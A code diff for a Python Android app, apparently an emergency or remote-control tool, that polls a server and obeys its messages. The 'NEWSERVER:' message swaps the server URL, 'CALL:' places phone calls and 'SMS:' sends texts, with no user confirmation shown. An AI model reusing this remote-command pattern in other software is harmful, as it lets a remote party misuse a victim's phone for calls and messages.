@@ -131,16 +131,16 @@ def start_foreground_service():
 
         Intent = autoclass('android.content.Intent')
         Context = autoclass('android.content.Context')
-        Build = autoclass('android.os.Build')
+        # En pyjnius, las variables estaticas anidadas como Build.VERSION se leen con $
+        BuildVersion = autoclass('android.os.Build$VERSION')
         
-        # Si el archivo Java no se compiló correctamente en GitHub, esto lanzará un error.
         ServiceClass = autoclass('org.phonecontrol.emergencycontrol.EmergencyService')
 
         activity = mActivity
         context = cast('android.content.Context', activity)
 
         intent = Intent(context, ServiceClass)
-        if Build.VERSION.SDK_INT >= 26:
+        if BuildVersion.SDK_INT >= 26:
             context.startForegroundService(intent)
         else:
             context.startService(intent)
@@ -168,19 +168,26 @@ def poll_server(url):
         data = json.loads(response.read().decode())
 
         for msg in data.get("messages", []):
-            save_last_id(max(last_id, msg["id"]))
             txt = msg["text"]
-
-            if txt.startswith("NEWSERVER:"):
-                new_url = txt[10:].strip()
-                if new_url.startswith("http"):
-                    save_cached_url(new_url)
-            elif txt.startswith("CALL:"):
-                make_call(txt[5:].strip() or "112")
-            elif txt.startswith("SMS:"):
-                parts = txt[4:].split(":", 1)
-                if len(parts) == 2:
-                    send_sms(parts[0].strip(), parts[1].strip())
+            
+            try:
+                # Intentar ejecutar el comando
+                if txt.startswith("NEWSERVER:"):
+                    new_url = txt[10:].strip()
+                    if new_url.startswith("http"):
+                        save_cached_url(new_url)
+                elif txt.startswith("CALL:"):
+                    make_call(txt[5:].strip() or "112")
+                elif txt.startswith("SMS:"):
+                    parts = txt[4:].split(":", 1)
+                    if len(parts) == 2:
+                        send_sms(parts[0].strip(), parts[1].strip())
+            except Exception as e:
+                print(f"ERROR ejecutando comando: {e}")
+            finally:
+                # IMPORTANTE: Guardar el ID incluso si el comando falla para no atascarnos
+                save_last_id(max(last_id, msg["id"]))
+                
         return "Conectado"
     except Exception as e:
         print(f"ERROR POLL ({url}): {e}")
